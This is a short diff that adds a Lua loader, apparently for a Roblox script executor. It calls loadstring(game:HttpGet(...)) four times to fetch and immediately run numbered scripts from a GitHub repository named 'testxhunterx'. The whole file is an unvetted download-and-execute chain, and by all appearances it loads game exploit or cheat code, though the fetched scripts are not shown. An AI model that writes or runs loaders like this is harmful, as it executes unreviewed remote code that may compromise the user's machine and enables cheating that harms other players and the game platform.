@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rokasltu197/testxhunterx/refs/heads/main/part1.lua"))()
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rokasltu197/testxhunterx/refs/heads/main/part2.lua"))()
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rokasltu197/testxhunterx/refs/heads/main/part4.lua"))()
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rokasltu197/testxhunterx/refs/heads/main/part5.lua"))()
